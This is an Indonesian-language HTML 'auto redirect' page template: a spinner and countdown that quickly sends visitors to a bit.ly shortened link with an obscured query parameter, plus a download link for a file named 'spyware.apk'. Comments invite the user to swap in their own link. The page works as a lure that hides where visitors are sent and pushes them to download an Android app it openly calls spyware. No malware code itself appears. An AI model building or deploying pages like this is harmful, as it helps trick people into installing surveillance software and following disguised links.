<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Auto Redirect</title>
<style>
  :root {
    --bg: #0a0a0f;
    --fg: #e8e8f0;
    --accent: #00ffa3;
    --muted: #5a5a7a;
    --card: #12121c;
    --border: #1e1e30;
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    background: var(--bg);
    color: var(--fg);
    font-family: 'Segoe UI', sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
  }

  /* Background animasi gerak */
  .bg-blob {
    position: fixed;
    border-radius: 50%;
    filter: blur(120px);
    opacity: 0.25;
    animation: float 6s ease-in-out infinite alternate;
    pointer-events: none;
  }
  .bg-blob.one {
    width: 500px; height: 500px;
    background: var(--accent);
    top: -150px; left: -100px;
  }
  .bg-blob.two {
    width: 400px; height: 400px;
    background: #ff3366;
    bottom: -120px; right: -80px;
    animation-delay: -3s;
  }

  @keyframes float {
    0% { transform: translate(0, 0) scale(1); }
    100% { transform: translate(40px, 30px) scale(1.15); }
  }

  .container {
    text-align: center;
    position: relative;
    z-index: 2;
  }

  /* Spinner */
  .spinner-ring {
    width: 80px; height: 80px;
    margin: 0 auto 32px;
    border-radius: 50%;
    border: 4px solid var(--border);
    border-top-color: var(--accent);
    animation: spin 0.8s linear infinite;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  h1 {
    font-size: 1.6rem;
    font-weight: 700;
    margin-bottom: 8px;
    letter-spacing: -0.5px;
  }
  .sub {
    color: var(--muted);
    font-size: 0.95rem;
    margin-bottom: 28px;
  }

  /* Progress bar */
  .progress-wrap {
    width: 280px;
    height: 6px;
    background: var(--border);
    border-radius: 99px;
    margin: 0 auto 16px;
    overflow: hidden;
  }
  .progress-bar {
    height: 100%;
    width: 0%;
    background: var(--accent);
    border-radius: 99px;
    transition: width 0.3s ease;
  }

  .countdown {
    font-size: 0.85rem;
    color: var(--muted);
    margin-bottom: 24px;
  }
  .countdown span {
    color: var(--accent);
    font-weight: 700;
  }

  /* Link manual fallback */
  .manual-link {
    display: inline-block;
    padding: 12px 28px;
    background: transparent;
    border: 1.5px solid var(--accent);
    color: var(--accent);
    text-decoration: none;
    border-radius: 8px;
    font-weight: 600;
    font-size: 0.9rem;
    transition: all 0.25s ease;
    opacity: 0;
    animation: fadeIn 0.5s ease 2.5s forwards;
  }
  .manual-link:hover {
    background: var(--accent);
    color: var(--bg);
  }

  @keyframes fadeIn {
    to { opacity: 1; }
  }

  /* Toast notif */
  .toast {
    position: fixed;
    bottom: 32px;
    left: 50%;
    transform: translateX(-50%) translateY(20px);
    background: var(--card);
    border: 1px solid var(--border);
    color: var(--fg);
    padding: 12px 24px;
    border-radius: 10px;
    font-size: 0.85rem;
    opacity: 0;
    transition: all 0.4s ease;
    pointer-events: none;
    z-index: 99;
  }
  .toast.show {
    opacity: 1;
    transform: translateX(-50%) translateY(0);
  }
</style>
</head>
<body>

<!-- Background blob -->
<div class="bg-blob one"></div>
<div class="bg-blob two"></div>

<div class="container">
  <div class="spinner-ring"></div>
  <h1>Membuka Link...</h1>
  <p class="sub">Tunggu sebentar, kamu akan dialihkan otomatis</p>
  <div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
  <p class="countdown">Redirect dalam <span id="timer">3</span> detik</p>
   <a href="spyware.apk" download>Klik di sini untuk download</a>

  <!-- ============================================== -->
  <!--  GANTI HREF DI BAWAH DENGAN LINK KAMU          -->
  <!-- ============================================== -->
  <a class="manual-link" id="targetLink" href="https://bit.ly/49C33rJ?ᎴᏗᏖᏗ=">Klik manual jika tidak otomatis</a>
</div>

<div class="toast" id="toast"></div>

<script>
  // =============================================
  // GANTI LINK DI BAWAH INI DENGAN LINK KAMU
  // =============================================
  const TARGET_URL = 'https://bit.ly/49C33rJ?ᎴᏗᏖᏗ=example';

  // Set href link manual juga
  document.getElementById('targetLink').href = TARGET_URL;

  // Set link di address bar (tanpa klik dulu)
  const TOTAL_SECONDS = 0.5;
  let remaining = TOTAL_SECONDS;
  const timerEl = document.getElementById('timer');
  const progressBar = document.getElementById('progressBar');
  const toast = document.getElementById('toast');

  // Tampilkan toast
  function showToast(msg) {
    toast.textContent = msg;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 2500);
  }

  // Countdown + progress
  const interval = setInterval(() => {
    remaining--;
    timerEl.textContent = remaining;
    const pct = ((TOTAL_SECONDS - remaining) / TOTAL_SECONDS) * 100;
    progressBar.style.width = pct + '%';

    if (remaining <= 0) {
      clearInterval(interval);
      progressBar.style.width = '100%';
      showToast('Membuka link sekarang...');

      // Auto klik link setelah countdown selesai
      setTimeout(() => {
        window.location.href = TARGET_URL;
      }, 400);
    }
  }, 1000);
</script>
</body>
</html>
